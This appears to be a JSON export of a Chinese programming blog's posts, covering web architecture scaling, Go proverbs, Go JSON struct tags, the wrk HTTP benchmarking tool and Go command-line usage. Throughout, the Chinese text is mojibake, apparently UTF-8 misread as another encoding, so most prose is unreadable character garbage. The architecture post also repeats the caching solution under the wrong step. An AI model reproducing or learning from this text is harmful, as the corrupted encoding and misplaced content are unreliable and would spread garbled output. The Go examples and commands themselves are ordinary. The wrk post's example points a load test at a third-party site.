å•æœºæ—¶ä»£æœ€å¼€å§‹çš„æ—¶å€™ï¼Œç”¨æˆ·é‡å¾ˆå°‘ï¼Œä¸€å¤©å°±å‡ ç™¾ä¸Šåƒä¸ªè¯·æ±‚ï¼Œæ­¤æ—¶ä¸€å°æœåŠ¡å™¨å°±å®Œå…¨è¶³å¤Ÿã€‚ Javaã€Pythonã€PHPæˆ–è€…å…¶ä»–åç«¯è¯­è¨€å¼€å‘ä¸€ä¸ªWebåç«¯æœåŠ¡ï¼Œå†ç”¨ä¸€ä¸ªMySQLæ¥å­˜å‚¨ä¸šåŠ¡æ•°æ®ï¼Œå®ƒä¿©æºæ‰‹å·¥ä½œï¼Œè¿è¡Œåœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œå¯¹å¤–æä¾›æœåŠ¡ã€‚ éšç€æ•°æ®é‡å¢åŠ ã€è®¿é—®é‡å¢åŠ ï¼ŒMySQL ä¼šå‡ºç°æŸ¥è¯¢å˜æ…¢ï¼ŒWeb æœåŠ¡ä¼šå‡ºç°è®¿é—®å˜æ…¢ã€‚ è§£å†³æ–¹æ¡ˆï¼š åˆ›å»ºç´¢å¼•å’Œä¼˜åŒ–ç´¢å¼•ï¼Œè§£å†³æŸ¥è¯¢å˜æ…¢çš„é—®é¢˜ã€‚ å¢åŠ  CDNï¼ˆè®©é™æ€èµ„æºä¸è‡³äºç›´æ¥è¯·æ±‚æœåŠ¡å™¨ï¼‰ å¢åŠ æœåŠ¡å™¨ï¼Œä½¿ç”¨ nginx åšè´Ÿè½½å‡è¡¡ï¼ˆåˆ†æ•£å•å°å‹åŠ›ï¼‰ è´Ÿè½½å‡è¡¡æ•°æ®é‡è¿˜åœ¨ç»§ç»­å¢åŠ ï¼Œå•å°æœåŠ¡å™¨å·²ç»ä¸èƒ½æ»¡è¶³éœ€æ±‚äº†ã€‚ è§£å†³æ–¹æ¡ˆï¼š é€šè¿‡ Mysql binlog å®ç°ä¸»ä»å¤åˆ¶ å¯¹ä¸åŒç”¨æˆ·åˆ›å»ºä¸åŒè¯»å†™æƒé™ï¼Œå®ç°è¯»å†™åˆ†ç¦» åˆ†åº“åˆ†è¡¨ æ•°æ®è¯»å†™åˆ†ç¦»æ•°æ®çš„å‹åŠ›ç»§ç»­å¢å¤§ï¼Œæ•°æ®åº“ä»ç„¶æ˜¯ç“¶é¢ˆã€‚ è§£å†³æ–¹æ¡ˆï¼š å¼•å…¥ç¼“å­˜ç³»ç»Ÿï¼Œå¯ä»¥æœ‰æ•ˆç¼©çŸ­æœåŠ¡çš„å“åº”æ—¶é—´ ç¼“å­˜ç³»ç»Ÿéšç€æµé‡ç»§ç»­å¢åŠ ï¼Œä¸šåŠ¡é€»è¾‘ä¼šå˜å¾—è¶Šæ¥è¶Šå¤æ‚ï¼Œä»£ç ä¹Ÿä¼šè¶Šæ¥è¶Šå¤æ‚ã€‚ è§£å†³æ–¹æ¡ˆï¼š å¼•å…¥ç¼“å­˜ç³»ç»Ÿï¼Œå¯ä»¥æœ‰æ•ˆç¼©çŸ­æœåŠ¡çš„å“åº”æ—¶é—´ æ¶ˆæ¯é˜Ÿåˆ—æ­¤æ—¶è®¾è®¡åˆ°è¿™é‡Œï¼Œå·²ç»å®Œå…¨å¯ä»¥æ”¯æ’‘ç™¾ä¸‡çº§çš„æ•°æ®ã€‚ Mysql å¤©ç”Ÿé€‚åˆæµ·é‡çš„æ•°æ®å­˜å‚¨ï¼Œä¸é€‚åˆæµ·é‡æ•°æ®çš„æŸ¥è¯¢ï¼Œæ‰€ä»¥æ­¤æ—¶æ•°æ®çš„æŸ¥è¯¢å°±æˆäº†ç“¶é¢ˆã€‚ è§£å†³æ–¹æ¡ˆï¼š å¼•å…¥æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¼‚æ­¥ã€è§£è—•ã€å‰Šå³° æœç´¢å¼•æ“è§£å†³æ–¹æ¡ˆï¼š å¼•å…¥ ElasticSearch å¼•å…¥æœç´¢å¼•æ“ä¹‹åï¼Œè¿˜å¯ä»¥å¯¹æ¶æ„è¿›è¡Œä¼˜åŒ–ã€‚ æœ€åç‰ˆæœ¬ ä¸Šé¢å°±æ˜¯ä»æœ€ç®€å•çš„å•æœºåˆ°å¤æ‚é›†ç¾¤çš„é«˜å¹¶å‘æ¼”è¿›ä¹‹è·¯ï¼Œæ¶æ„è®¾è®¡åˆ°æœ€åï¼Œåšå¥½é›†ç¾¤çš„è¯ï¼Œæ”¯æŒäº¿çº§çš„æ•°æ®æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚ å…¶ä¸­çš„æœç´¢å¼•æ“ï¼Œæ¶ˆæ¯é˜Ÿåˆ—ç­‰éƒ½æ˜¯å¯ä»¥æ›¿ä»£çš„ã€‚ é«˜å¯ç”¨ã€é«˜å¹¶å‘ã€é«˜æ€§èƒ½æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„è¯é¢˜ï¼Œå®ƒæ‰€æ¶µç›–çš„ä¸œè¥¿å…¶å®ä¸æ­¢ä¸Šé¢è¿™äº›å†…å®¹ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªæ¨¡å—æ‹¿å‡ºæ¥éƒ½å¯ä»¥æ‰©å±•å‡ºå¾ˆå¤šçŸ¥è¯†ç‚¹ã€‚","categories":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}]},{"title":"Goè¯­è¨€ä¹‹ç¦…","slug":"the-en-of-go","date":"2022-12-18T08:11:11.000Z","updated":"2023-02-18T03:28:33.607Z","comments":true,"path":"the-en-of-go/","link":"","permalink":"https://www.0x2beace.com/the-en-of-go/","excerpt":"Goè¯­è¨€ä¹‹ç¦…","text":"Goè¯­è¨€ä¹‹ç¦… Go ç®´è¨€ ä¸è¦é€šè¿‡å…±äº«å†…å­˜è¿›è¡Œé€šä¿¡ï¼Œé€šè¿‡é€šä¿¡å…±äº«å†…å­˜ å¹¶å‘ä¸æ˜¯å¹¶è¡Œ ç®¡é“ç”¨äºåè°ƒï¼›äº’æ–¥é‡ï¼ˆé”ï¼‰ç”¨äºåŒæ­¥ æ¥å£è¶Šå¤§ï¼ŒæŠ½è±¡å°±è¶Šå¼± åˆ©ç”¨å¥½é›¶å€¼ ç©ºæ¥å£ interface{} æ²¡æœ‰ä»»ä½•ç±»å‹çº¦æŸ Gofmt çš„é£æ ¼ä¸æ˜¯äººä»¬æœ€å–œæ¬¢çš„ï¼Œä½† gofmt æ˜¯æ¯ä¸ªäººçš„æœ€çˆ± å…è®¸ä¸€ç‚¹ç‚¹é‡å¤æ¯”å¼•å…¥ä¸€ç‚¹ç‚¹ä¾èµ–æ›´å¥½ ç³»ç»Ÿè°ƒç”¨å¿…é¡»å§‹ç»ˆä½¿ç”¨æ„å»ºæ ‡è®°è¿›è¡Œä¿æŠ¤ å¿…é¡»å§‹ç»ˆä½¿ç”¨æ„å»ºæ ‡è®°ä¿æŠ¤ Cgo Cgo ä¸æ˜¯ Go ä½¿ç”¨æ ‡å‡†åº“çš„ unsafe åŒ…ï¼Œä¸èƒ½ä¿è¯èƒ½å¦‚æœŸè¿è¡Œ æ¸…æ™°æ¯”èªæ˜æ›´å¥½ åå°„æ°¸è¿œä¸æ¸…æ™° é”™è¯¯æ˜¯å€¼ ä¸è¦åªæ£€æŸ¥é”™è¯¯ï¼Œè¿˜è¦ä¼˜é›…åœ°å¤„ç†å®ƒä»¬ è®¾è®¡æ¶æ„ï¼Œå‘½åç»„ä»¶ï¼Œï¼ˆæ–‡æ¡£ï¼‰è®°å½•ç»†èŠ‚ æ–‡æ¡£æ˜¯ä¾›ç”¨æˆ·ä½¿ç”¨çš„ ä¸è¦ï¼ˆåœ¨ç”Ÿäº§ç¯å¢ƒï¼‰ä½¿ç”¨ panic() Go è¯­è¨€ä¹‹ç¦… æ¯ä¸ª package å®ç°å•ä¸€çš„ç›®çš„ æ˜¾å¼å¤„ç†é”™è¯¯ å°½æ—©è¿”å›ï¼Œè€Œä¸æ˜¯ä½¿ç”¨æ·±åµŒå¥— è®©è°ƒç”¨è€…å¤„ç†å¹¶å‘ï¼ˆå¸¦æ¥çš„é—®é¢˜ï¼‰ åœ¨å¯åŠ¨ä¸€ä¸ª goroutine æ—¶ï¼Œéœ€è¦çŸ¥é“ä½•æ—¶å®ƒä¼šåœæ­¢ é¿å… package çº§åˆ«çš„çŠ¶æ€ ç®€å•å¾ˆé‡è¦ ç¼–å†™æµ‹è¯•ä»¥é”å®š package API çš„è¡Œä¸º å¦‚æœä½ è§‰å¾—æ…¢ï¼Œå…ˆç¼–å†™ benchmark æ¥è¯æ˜ é€‚åº¦æ˜¯ä¸€ç§ç¾å¾· å¯ç»´æŠ¤æ€§ å‚è€ƒé“¾æ¥ The Zen of Go Go Proverbs","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ â€”â€”json ç»“æ„ä½“æ ‡ç­¾","slug":"go-language-study-notes-json-structure-tag","date":"2022-12-10T09:36:04.000Z","updated":"2023-02-18T03:28:33.590Z","comments":true,"path":"go-language-study-notes-json-structure-tag/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-json-structure-tag/","excerpt":"ä½¿ç”¨ Golang æ—¶ï¼Œç»å¸¸éœ€è¦åˆ›å»ºç»“æ„ä½“ï¼Œè€Œç»“æ„ä½“ç»å¸¸éœ€è¦è¢«åºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–ï¼Œé€šå¸¸ä¼šåœ¨ç»“æ„ä½“çš„ field ç±»å‹ååŠ ä¸Š json ç»“æ„ä½“æ ‡ç­¾ã€‚","text":"ä½¿ç”¨ Golang æ—¶ï¼Œç»å¸¸éœ€è¦åˆ›å»ºç»“æ„ä½“ï¼Œè€Œç»“æ„ä½“ç»å¸¸éœ€è¦è¢«åºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–ï¼Œé€šå¸¸ä¼šåœ¨ç»“æ„ä½“çš„ field ç±»å‹ååŠ ä¸Š json ç»“æ„ä½“æ ‡ç­¾ã€‚ json ç»“æ„ä½“æ ‡ç­¾ï¼Œå¸¸è§çš„å…³é”®å­—æœ‰ omitempty å’Œ -ï¼Œä¸‹é¢ä¸€èµ·æ¥çœ‹ä¸€ä¸‹ï¼Œè¿™å‡ ç§çš„åŒºåˆ«ã€‚ ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576type User struct &#123; Id string Name string age int gender string nickname string&#125;type User2 struct &#123; Id string `json:\"id\"` Name string `json:\"name\"` Age int `json:\"age\"` Gender string `json:\"gender\"` NickName string `json:\"nickname\"`&#125;type User3 struct &#123; Id string `json:\"id\"` Name string `json:\"name,omitempty\"` Age int `json:\"age,omitempty\"` Gender string `json:\"gender,omitempty\"` NickName string `json:\"nickname,omitempty\"`&#125;type User4 struct &#123; Id string `json:\"id\"` Name string `json:\"name,omitempty\"` Age int `json:\"-\"` Gender string `json:\"gender,omitempty\"` NickName string `json:\"nickname,omitempty\"`&#125;func main() &#123; u := User&#123; Id: \"1\", Name: \"å¼ ä¸‰\", age: 20, gender: \"ç”·\", &#125; data, err := json.Marshal(u) if err != nil &#123; fmt.Println(err.Error()) &#125; u2 := User2&#123; \"1\", \"å¼ ä¸‰\", 20, \"ç”·\", \"\", &#125; data2, _ := json.Marshal(u2) u3 := User3&#123; Id: \"1\", &#125; data3, _ := json.Marshal(u3) u4 := User2&#123; Id: \"1\", &#125; data4, _ := json.Marshal(u4) u5 := User4&#123; Id: \"1\", Name: \"å¼ ä¸‰\", Age: 19, Gender: \"ç”·\", &#125; data5, _ := json.Marshal(u5) fmt.Printf(\"%s ï¼šåªä¼šæ‰“å°å‡ºé¦–å­—æ¯å¤§å†™çš„ fieldï¼Œé¦–å­—æ¯å°å†™çš„ field åªå…è®¸åœ¨åŒ…å†…ä½¿ç”¨ï¼Œæ²¡æœ‰ä½¿ç”¨ json ç»“æ„ä½“æ ‡ç­¾ï¼Œåºåˆ—åŒ–ä¹‹åçš„ json æ•°æ®ï¼Œfield ä¸ä¼šå‘ç”Ÿå˜åŒ– \\n\", string(data)) fmt.Printf(\"%s :ä½¿ç”¨ json ç»“æ„ä½“æ ‡ç­¾ï¼Œåºåˆ—åŒ–ä¹‹åçš„ json æ•°æ®ï¼Œfield å’Œ json ç»“æ„ä½“ä¿æŒä¸€è‡´ \\n\", string(data2)) fmt.Printf(\"%s :ä½¿ç”¨ json ç»“æ„ä½“æ ‡ç­¾ï¼ŒåŒæ—¶ä½¿ç”¨ omitempty æ ‡è®°ï¼Œåˆå§‹åŒ–æ—¶ï¼Œåªæœ‰ Id å­—æ®µè¿›è¡Œèµ‹å€¼ \\n\", string(data3)) fmt.Printf(\"%s :ä½¿ç”¨ json ç»“æ„ä½“æ ‡ç­¾ï¼Œæœªä½¿ç”¨ omitempty æ ‡è®°ï¼Œåˆå§‹åŒ–æ—¶ï¼Œåªæœ‰ Id å­—æ®µè¿›è¡Œèµ‹å€¼ \\n\", string(data4)) fmt.Printf(\"%s :ä½¿ç”¨ json ç»“æ„ä½“æ ‡ç­¾ï¼ŒåŒæ—¶ä½¿ç”¨ - æ ‡è®°ä»¥åŠ omitempty æ ‡è®° \\n\", string(data5))&#125; è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œå¾—åˆ°ä»¥ä¸‹è¾“å‡ºï¼š 12345&#123;\"Id\":\"1\",\"Name\":\"å¼ ä¸‰\"&#125; ï¼šåªä¼šæ‰“å°å‡ºé¦–å­—æ¯å¤§å†™çš„ fieldï¼Œé¦–å­—æ¯å°å†™çš„ field åªå…è®¸åœ¨åŒ…å†…ä½¿ç”¨ï¼Œæ²¡æœ‰ä½¿ç”¨ json ç»“æ„ä½“æ ‡ç­¾ï¼Œåºåˆ—åŒ–ä¹‹åçš„ json æ•°æ®ï¼Œfield ä¸ä¼šå‘ç”Ÿå˜åŒ– &#123;\"id\":\"1\",\"name\":\"å¼ ä¸‰\",\"age\":20,\"gender\":\"ç”·\",\"nickname\":\"\"&#125; :ä½¿ç”¨ json ç»“æ„ä½“æ ‡ç­¾ï¼Œåºåˆ—åŒ–ä¹‹åçš„ json æ•°æ®ï¼Œfield å’Œ json ç»“æ„ä½“ä¿æŒä¸€è‡´ &#123;\"id\":\"1\"&#125; :ä½¿ç”¨ json ç»“æ„ä½“æ ‡ç­¾ï¼ŒåŒæ—¶ä½¿ç”¨ omitempty æ ‡è®°ï¼Œåˆå§‹åŒ–æ—¶ï¼Œåªæœ‰ Id å­—æ®µè¿›è¡Œèµ‹å€¼ &#123;\"id\":\"1\",\"name\":\"\",\"age\":0,\"gender\":\"\",\"nickname\":\"\"&#125; :ä½¿ç”¨ json ç»“æ„ä½“æ ‡ç­¾ï¼Œæœªä½¿ç”¨ omitempty æ ‡è®°ï¼Œåˆå§‹åŒ–æ—¶ï¼Œåªæœ‰ Id å­—æ®µè¿›è¡Œèµ‹å€¼ &#123;\"id\":\"1\",\"name\":\"å¼ ä¸‰\",\"gender\":\"ç”·\"&#125; :ä½¿ç”¨ json ç»“æ„ä½“æ ‡ç­¾ï¼ŒåŒæ—¶ä½¿ç”¨ - æ ‡è®°ä»¥åŠ omitempty æ ‡è®° æ€»ç»“ json ç»“æ„ä½“æ ‡ç­¾ï¼Œç”¨äºç»“æ„ä½“åºåˆ—åŒ–æ—¶ï¼Œå°†ç»“æ„ä½“ä¸ json æ•°æ®è§£è—• å®šä¹‰ä¸º json:&quot;field&quot; æ ¼å¼çš„ç»“æ„ä½“ï¼Œåœ¨åˆå§‹åŒ–æ—¶ï¼Œfield å­—æ®µä¸èƒ½çœç•¥ï¼Œå¦åˆ™ä¼šç¼–è¯‘é”™è¯¯ å®šä¹‰ä¸º json:&quot;nickname,omitempty&quot; æ ¼å¼çš„ç»“æ„ä½“ï¼Œåœ¨åˆå§‹åŒ–æ—¶ï¼Œfield å­—æ®µå¯ä»¥çœç•¥ã€‚å½“çœç•¥ field å­—æ®µè¿›è¡Œèµ‹å€¼æ—¶ï¼Œåºåˆ—åŒ–ä¹‹åçš„ json ä¹Ÿä¸ä¼šåŒ…å«è¯¥å­—æ®µï¼Œåä¹‹åˆ™ä¼šåŒ…å« å®šä¹‰ä¸º json:&quot;-&quot; æ ¼å¼çš„ç»“æ„ä½“ï¼Œåˆå§‹åŒ–æ—¶ï¼Œæ— è®ºæ˜¯å¦èµ‹å€¼ï¼Œåºåˆ—åŒ–ä¹‹åçš„ json éƒ½ä¸ä¼šåŒ…å«è¯¥å­—æ®µ","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Wrk æ€§èƒ½æµ‹è¯•å·¥å…·","slug":"wrk-performance-testing-tool","date":"2022-12-04T02:57:25.000Z","updated":"2023-02-18T03:28:33.611Z","comments":true,"path":"wrk-performance-testing-tool/","link":"","permalink":"https://www.0x2beace.com/wrk-performance-testing-tool/","excerpt":"å¸¸ç”¨çš„æ€§èƒ½æµ‹è¯•å·¥å…·ï¼ŒApache ab è¿™ä¸ªç”¨å¾—æ¯”è¾ƒå¤šçš„ï¼Œè¿™ç¯‡ç¬”è®°ç”¨æ¥ä»‹ç»å¦å¤–ä¸€ä¸ªè½»é‡çº§æ€§èƒ½æµ‹è¯•å·¥å…·â€”â€”wrkã€‚","text":"å¸¸ç”¨çš„æ€§èƒ½æµ‹è¯•å·¥å…·ï¼ŒApache ab è¿™ä¸ªç”¨å¾—æ¯”è¾ƒå¤šçš„ï¼Œè¿™ç¯‡ç¬”è®°ç”¨æ¥ä»‹ç»å¦å¤–ä¸€ä¸ªè½»é‡çº§æ€§èƒ½æµ‹è¯•å·¥å…·â€”â€”wrkã€‚ wrk æ˜¯ä¸€æ¬¾é’ˆå¯¹ Http åè®®çš„åŸºå‡†æµ‹è¯•å·¥å…·ï¼Œå®ƒèƒ½å¤Ÿåœ¨å•æœºå¤šæ ¸ CPU çš„æ¡ä»¶ä¸‹ï¼Œä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„é«˜æ€§èƒ½ I/O æœºåˆ¶ï¼Œå¦‚ epollï¼Œkqueue ç­‰ï¼Œé€šè¿‡å¤šçº¿ç¨‹å’Œäº‹ä»¶æ¨¡å¼ï¼Œå¯¹ç›®æ ‡æœºå™¨äº§ç”Ÿå¤§é‡çš„è´Ÿè½½â€”â€”Github wrk çš„ä¼˜åŠ¿ï¼š è½»é‡çº§çš„æ€§èƒ½æµ‹è¯•å·¥å…·ï¼Œå¼€ç®±å³ç”¨ å®‰è£…ç®€å•ï¼Œå„å¤§æ“ä½œç³»ç»ŸåŸºæœ¬ä¸Šéƒ½èƒ½ä¸€é”®å®‰è£… å­¦ä¹ æˆæœ¬å¾ˆä½ï¼Œè®°ä½å¸¸ç”¨çš„å‡ ä¸ªå‚æ•°å³å¯ åŸºäºç³»ç»Ÿè‡ªå¸¦çš„é«˜æ€§èƒ½ I/O æœºåˆ¶ï¼Œå¦‚ epoll, kqueue, åˆ©ç”¨å¼‚æ­¥çš„äº‹ä»¶é©±åŠ¨æ¡†æ¶ï¼Œé€šè¿‡å¾ˆå°‘çš„çº¿ç¨‹å°±å¯ä»¥å‹å‡ºå¾ˆå¤§çš„å¹¶å‘é‡ å®‰è£…MacOSwrk çš„å®‰è£…éå¸¸ç®€å•ï¼š 1$ brew install wrk Ubuntu12$ sudo apt-get update$ sudo apt-get install wrk éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸï¼š 12$ wrk -vwrk 4.2.0 [kqueue] Copyright (C) 2012 Will Glozer ä½¿ç”¨æ–¹æ³•wrk å‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š 1$ wrk &lt;options&gt; &lt;url&gt; å…¶ä¸­å¸¸ç”¨å‚æ•°å¦‚ä¸‹ï¼š -c, â€“conections: è·ŸæœåŠ¡å™¨å»ºç«‹å¹¶ä¿æŒçš„ TCP è¿æ¥æ•°é‡ -d, â€“duration: å‹æµ‹æ—¶é—´ï¼Œé»˜è®¤ä¸º 10s -t, â€“threads: ä½¿ç”¨å¤šå°‘ä¸ªçº¿ç¨‹è¿›è¡Œå‹æµ‹ï¼ˆçº¿ç¨‹æ•°ä¸€èˆ¬æ˜¯æ ¸æ•°çš„ 2 åˆ° 4 å€ï¼Œè¿‡å¤šä¼šå‡ºç°çº¿ç¨‹åˆ‡æ¢è¿‡å¤šå¯¼è‡´æ•ˆç‡é™ä½ï¼‰ -H: æŒ‡å®šè¯·æ±‚çš„ HTTP Headerï¼Œæœ‰äº› API éœ€è¦ä¼ å…¥ä¸€äº› Headerï¼Œå¯é€šè¿‡ Wrk çš„ -H å‚æ•°æ¥ä¼ å…¥ â€“latency: åœ¨å‹æµ‹ç»“æŸä¹‹åï¼Œæ‰“å°å»¶è¿Ÿç»Ÿè®¡ä¿¡æ¯ -T â€“timeout: è¯·æ±‚è¶…æ—¶æ—¶é—´ -vï¼Œâ€“version: æ‰“å°æ­£åœ¨ä½¿ç”¨ wrk è¯¦ç»†ç‰ˆæœ¬ä¿¡æ¯ -s, â€“script: æŒ‡å®š Lua è„šæœ¬è·¯å¾„ æµ‹è¯•æŠ¥å‘Šåˆ©ç”¨ wrk å¯¹ www.baidu.com å‘èµ·å‹åŠ›æµ‹è¯•ï¼Œçº¿ç¨‹æ•°ä¸º 4ï¼Œæ¨¡æ‹Ÿ 300 ä¸ªå¹¶å‘è¯·æ±‚ï¼ŒæŒç»­ 30 ç§’ï¼Œå¹¶åœ¨å‹æµ‹ç»“æŸä¹‹åï¼Œæ‰“å°å»¶è¿Ÿç»Ÿè®¡ä¿¡æ¯ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”Go æ ‡å‡†å‘½ä»¤å­¦ä¹ ","slug":"go-language-study-notes-standard-command-learning","date":"2022-12-01T09:56:58.000Z","updated":"2023-02-18T03:28:33.593Z","comments":true,"path":"go-language-study-notes-standard-command-learning/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-standard-command-learning/","excerpt":"Go è¯­è¨€æ ‡å‡†å‘½ä»¤è¯¦è§£ã€‚","text":"Go è¯­è¨€æ ‡å‡†å‘½ä»¤è¯¦è§£ã€‚ go envgo env æ˜¯éå¸¸å¸¸ç”¨çš„å‘½ä»¤ï¼Œç”¨äºæŸ¥çœ‹å½“å‰çš„ go ç¯å¢ƒä¿¡æ¯ã€‚ åé¢è·Ÿä¸Šç¯å¢ƒå˜é‡åç§°ï¼Œåˆ™å¯ä»¥è¾“å‡ºå¯¹åº”ç¯å¢ƒå˜é‡çš„å€¼ï¼š 12$ go env GOROOT/usr/local/go å¦‚æœè¦ä¿®æ”¹æŸä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•ä¿®æ”¹å‘¢ï¼Ÿ ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œä¿®æ”¹çš„ä½ç½®ä¸åŒï¼š Mac å’Œ Linux æ˜¯ ~/.bashrc æˆ– ~/.bash_profile æ–‡ä»¶ å¦‚æœä½¿ç”¨äº†Zsh é‚£ä¹ˆå°±æ˜¯ ~/.zshrc æ–‡ä»¶ Windows åˆ™éœ€è¦å»ç³»ç»Ÿè®¾ç½®é‡Œé¢çš„ç¯å¢ƒå˜é‡ä¸­ä¿®æ”¹ 1234# æ›´æ–°ç¯å¢ƒå˜é‡çš„å€¼export GOROOT=/usr/local/go# åŠ å…¥ç¯å¢ƒå˜é‡ä¸­export PATH=$PATH:$GOROOT/bin æ·»åŠ ä»¥ä¸Šå†…å®¹åˆ°ç¯å¢ƒé…ç½®æ–‡ä»¶ä¸­ï¼Œå¹¶ä¿å­˜ï¼Œæ‰§è¡Œsource ~/.zshrcå‘½ä»¤åˆ·æ–°ç¯å¢ƒå˜é‡å³å¯ã€‚ go buildgo build ä¹Ÿæ˜¯éå¸¸å¸¸ç”¨çš„å‘½ä»¤ï¼Œç”¨äºå¯¹ Go ç¨‹åºè¿›è¡Œç¼–è¯‘ï¼Œå‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š 1$ go build [-o output] [-i] [build flags] [packages] æœ‰ä¸¤ç§æƒ…å†µï¼š å¯¹äºæ™®é€šåŒ…ï¼ˆ é main åŒ…ï¼‰è€Œè¨€ï¼Œåªä¼šæ‰§è¡Œç¼–è¯‘æ£€æŸ¥, ä¸ä¼šäº§ç”Ÿä»»ä½•æ–‡ä»¶ å¯¹äº main åŒ…é™¤äº†è¿›è¡Œç¼–è¯‘æ£€æŸ¥å¤–ï¼Œè¿˜ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ å¦‚æœå½“å‰ç›®å½•ä¸‹æœ‰å¤šä¸ªæ–‡ä»¶ï¼Œå´åªæƒ³ç¼–è¯‘æŸä¸ªæ–‡ä»¶ï¼Œå¯ä»¥åœ¨å‘½ä»¤åé¢æŒ‡å®šæ–‡ä»¶åç§°ï¼š 1$ go build main.go Goæä¾›äº†ç¼–è¯‘é“¾å·¥å…·ï¼Œå¯ä»¥è®©æˆ‘ä»¬åœ¨ä»»ä½•ä¸€ä¸ªå¼€å‘å¹³å°ä¸Šï¼Œç¼–è¯‘å‡ºå…¶ä»–å¹³å°çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯æ ¹æ®å½“å‰çš„æœºå™¨ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¦‚æœéœ€è¦åœ¨å½“å‰ç¯å¢ƒç¼–è¯‘å‡ºå…¶ä»–æ“ä½œç³»ç»Ÿçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‚£ä¹ˆä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š 1$ GOOS=linux GOARCH=amd64 go build bash GOOS è¡¨ç¤ºçš„æ˜¯æ“ä½œç³»ç»Ÿçš„åç§°ï¼ŒGOARCH è¡¨ç¤ºçš„æ˜¯ç›®æ ‡å¤„ç†å™¨çš„æ¶æ„ã€‚ go rungo build å‘½ä»¤æ˜¯å¯¹ç¨‹åºè¿›è¡Œç¼–è¯‘ï¼Œgo run åˆ™æ˜¯å¯¹ç¨‹åºè¿›è¡Œè¿è¡Œï¼Œç›¸å½“äºæ˜¯æŠŠç¼–è¯‘å’Œæ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶è¿™ä¸¤æ­¥ï¼Œåˆå¹¶æˆäº†ä¸€æ­¥ï¼š 12$ go run hello.gohello world go installgo install å’Œ go build ç±»ä¼¼ï¼Œä¸è¿‡å®ƒå¯ä»¥åœ¨ç¼–è¯‘åï¼Œä¼šæŠŠç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶æˆ–è€…åº“å®‰è£…åˆ°å¯¹åº”çš„ç›®å½•ä¸‹ï¼Œä»¥ä¾›ä½¿ç”¨ã€‚ å®ƒçš„ç”¨æ³•å’Œ go build å·®ä¸å¤šï¼Œå¦‚æœä¸æŒ‡å®šä¸€ä¸ªåŒ…åï¼Œå°±ä½¿ç”¨å½“å‰ç›®å½•ã€‚å®‰è£…çš„ç›®å½•éƒ½æ˜¯çº¦å®šå¥½çš„ï¼Œå¦‚æœç”Ÿæˆçš„æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‚£ä¹ˆå®‰è£…åœ¨ $GOPATH/bin ç›®å½•ä¸‹ï¼›å¦‚æœæ˜¯å¯å¼•ç”¨çš„åº“ï¼Œé‚£ä¹ˆå®‰è£…åœ¨ $GOPATH/pkg ç›®å½•ä¸‹ã€‚ æœ‰æ—¶å€™ä¸€äº›ç¬¬ä¸‰æ–¹çš„ä¾èµ–ä¼šæä¾›ä¸€äº›å‘½ä»¤è¡Œå·¥å…·ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šç”¨åˆ° go install å‘½ä»¤è¿›è¡Œå®‰è£…äº†ï¼Œä¾‹å¦‚å®‰è£… Airï¼š 1$ GO111MODULE=on go install github.com/cosmtrek/air@latest go getgo get å‘½ä»¤ä¹Ÿæ˜¯ååˆ†å¸¸ç”¨çš„ï¼Œç”¨äºä¸‹è½½æ›´æ–°æŒ‡å®šçš„åŒ…ä»¥åŠä¾èµ–çš„åŒ…ï¼Œå¹¶å¯¹å®ƒä»¬è¿›è¡Œç¼–è¯‘å’Œå®‰è£…ã€‚ å¦‚æœéœ€è¦æ›´æ–°æŸä¸ªä¾èµ–åŒ…ï¼Œåˆ™åŠ ä¸Š -u å‚æ•°ï¼š 1$ go get -u golang.org/x/sys 